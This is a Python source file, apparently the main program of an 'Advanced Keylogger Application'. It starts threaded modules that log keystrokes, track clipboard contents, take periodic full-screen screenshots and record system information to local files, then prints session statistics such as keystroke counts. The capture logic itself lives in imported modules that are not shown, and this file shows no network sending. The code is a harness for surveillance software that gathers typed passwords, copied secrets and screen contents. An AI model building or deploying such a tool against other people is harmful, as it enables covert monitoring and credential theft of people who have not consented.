"""
Advanced Keylogger Application
Integrates all monitoring and logging features
"""

import sys
import os
import threading
import time
from datetime import datetime
from pathlib import Path

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'src'))

from keylogger import Keylogger
from advanced_logger import AdvancedLogger
from system_info import SystemInfoCapture
from screenshot import ScreenshotCapture
from clipboard_tracker import ClipboardTracker
from config_manager import ConfigManager


class AdvancedKeyloggerApp:
    """Main application for advanced keylogging"""
    
    def __init__(self, config_file="config/config.json"):
        """
        Initialize the application
        
        Args:
            config_file (str): Path to configuration file
        """
        self.config = ConfigManager(config_file)
        self.config.validate_config()
        
        self.keylogger = None
        self.advanced_logger = None
        self.system_capture = None
        self.screenshot_capture = None
        self.clipboard_tracker = None
        
        self.is_running = False
        self.threads = []
        
        # Create directories
        Path(self.config.get("general.log_directory", "logs")).mkdir(parents=True, exist_ok=True)
        Path(self.config.get("general.screenshot_directory", "screenshots")).mkdir(parents=True, exist_ok=True)
        
        self._print_startup_message()
    
    def _print_startup_message(self):
        """Print startup information"""
        print("\n" + "="*60)
        print("Advanced Keylogger Application")
        print("="*60)
        print(f"[*] Configuration: {self.config.config_file}")
        print(f"[*] Log Directory: {self.config.get('general.log_directory')}")
        print(f"[*] Screenshot Directory: {self.config.get('general.screenshot_directory')}")
        print(f"[*] Enabled Modules: {', '.join(self.config.get_all_enabled_modules())}")
        print("="*60 + "\n")
    
    def _initialize_modules(self):
        """Initialize all enabled modules"""
        if self.config.is_enabled("keylogger"):
            log_file = self.config.get("keylogger.log_file", "logs/keylog.txt")
            self.keylogger = Keylogger(log_file)
            print("[+] Keylogger initialized")
        
        if self.config.is_enabled("advanced_logging"):
            log_dir = self.config.get("general.log_directory", "logs")
            self.advanced_logger = AdvancedLogger(log_dir)
            print("[+] Advanced Logger initialized")
        
        if self.config.is_enabled("system_info"):
            self.system_capture = SystemInfoCapture()
            print("[+] System Info Capture initialized")
        
        if self.config.is_enabled("screenshots"):
            save_dir = self.config.get("screenshots.save_directory", "screenshots")
            self.screenshot_capture = ScreenshotCapture(save_dir)
            print("[+] Screenshot Capture initialized")
        
        if self.config.is_enabled("clipboard"):
            log_file = self.config.get("clipboard.log_file", "logs/clipboard.txt")
            self.clipboard_tracker = ClipboardTracker(log_file)
            print("[+] Clipboard Tracker initialized")
    
    def _run_keylogger(self):
        """Run keylogger in a thread"""
        try:
            print("[*] Keylogger thread started")
            self.keylogger.start()
        except Exception as e:
            print(f"[!] Keylogger error: {e}")
        finally:
            print("[*] Keylogger thread ended")
    
    def _run_clipboard_tracker(self):
        """Run clipboard tracker"""
        try:
            print("[*] Clipboard tracker thread started")
            self.clipboard_tracker.start()
            while self.is_running:
                time.sleep(1)
        except Exception as e:
            print(f"[!] Clipboard tracker error: {e}")
        finally:
            self.clipboard_tracker.stop()
            print("[*] Clipboard tracker thread ended")
    
    def _run_system_monitor(self):
        """Run system monitoring in a thread"""
        try:
            print("[*] System monitor thread started")
            interval = self.config.get("system_info.capture_interval", 300)
            
            while self.is_running:
                try:
                    cpu = self.system_capture.get_cpu_usage()
                    memory = self.system_capture.get_memory_usage()
                    
                    if self.advanced_logger:
                        self.advanced_logger.log_event(
                            "system",
                            f"CPU: {cpu}%, Memory: {memory['percent']}"
                        )
                    
                    time.sleep(interval)
                except Exception as e:
                    print(f"[!] Error in system monitoring: {e}")
                    time.sleep(interval)
        except Exception as e:
            print(f"[!] System monitor error: {e}")
        finally:
            print("[*] System monitor thread ended")
    
    def _run_screenshot_monitor(self):
        """Run periodic screenshot capture"""
        try:
            print("[*] Screenshot monitor thread started")
            interval = self.config.get("screenshots.capture_interval", 600)
            
            while self.is_running:
                try:
                    if self.screenshot_capture:
                        screenshot_path = self.screenshot_capture.capture_full_screen()
                        if screenshot_path and self.advanced_logger:
                            self.advanced_logger.log_event("screenshot", screenshot_path)
                    
                    time.sleep(interval)
                except Exception as e:
                    print(f"[!] Error in screenshot capture: {e}")
                    time.sleep(interval)
        except Exception as e:
            print(f"[!] Screenshot monitor error: {e}")
        finally:
            print("[*] Screenshot monitor thread ended")
    
    def _log_startup_info(self):
        """Log startup system information"""
        if self.advanced_logger and self.system_capture:
            sys_info = SystemInfoCapture.get_system_info()
            for key, value in sys_info.items():
                self.advanced_logger.log_event(f"startup-{key}", str(value))
    
    def start(self):
        """Start the application"""
        print("[*] Starting Advanced Keylogger Application...")
        
        self._initialize_modules()
        self._log_startup_info()
        
        self.is_running = True
        
        # Start keylogger thread
        if self.keylogger:
            keylogger_thread = threading.Thread(target=self._run_keylogger, daemon=False)
            keylogger_thread.start()
            self.threads.append(keylogger_thread)
        
        # Start clipboard tracker thread
        if self.clipboard_tracker:
            clipboard_thread = threading.Thread(target=self._run_clipboard_tracker, daemon=True)
            clipboard_thread.start()
            self.threads.append(clipboard_thread)
        
        # Start system monitor thread
        if self.system_capture:
            monitor_thread = threading.Thread(target=self._run_system_monitor, daemon=True)
            monitor_thread.start()
            self.threads.append(monitor_thread)
        
        # Start screenshot monitor thread
        if self.config.get("screenshots.periodic_capture", False) and self.screenshot_capture:
            screenshot_thread = threading.Thread(target=self._run_screenshot_monitor, daemon=True)
            screenshot_thread.start()
            self.threads.append(screenshot_thread)
        
        print("[*] All modules started. Press Ctrl+C to stop.")
        
        # Wait for keylogger thread (main thread)
        try:
            for thread in self.threads:
                thread.join()
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop the application"""
        print("\n[*] Stopping Advanced Keylogger Application...")
        self.is_running = False
        
        # Stop individual modules
        if self.keylogger:
            self.keylogger.stop()
        
        if self.clipboard_tracker:
            self.clipboard_tracker.stop()
        
        # Save session data
        if self.advanced_logger:
            self.advanced_logger.save_session()
            stats = self.advanced_logger.get_session_stats()
            print(f"\n[*] Session Statistics:")
            print(f"    - Total Events: {stats['total_events']}")
            print(f"    - Keystrokes: {stats['keystrokes']}")
        
        # Wait for threads
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        print("[*] Application stopped successfully")
    
    def print_stats(self):
        """Print application statistics"""
        print("\n" + "="*60)
        print("Application Statistics")
        print("="*60)
        
        if self.advanced_logger:
            stats = self.advanced_logger.get_session_stats()
            print(f"Session ID: {stats['session_id']}")
            print(f"Start Time: {stats['start_time']}")
            print(f"Total Events: {stats['total_events']}")
            print(f"Keystrokes: {stats['keystrokes']}")
        
        if self.screenshot_capture:
            screenshots = self.screenshot_capture.get_screenshot_info()
            print(f"Screenshots: {len(screenshots) if screenshots else 0}")
        
        print("="*60 + "\n")


def main():
    """Main entry point"""
    try:
        app = AdvancedKeyloggerApp("config/config.json")
        app.start()
    except KeyboardInterrupt:
        print("\n[*] Application interrupted by user")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    main()
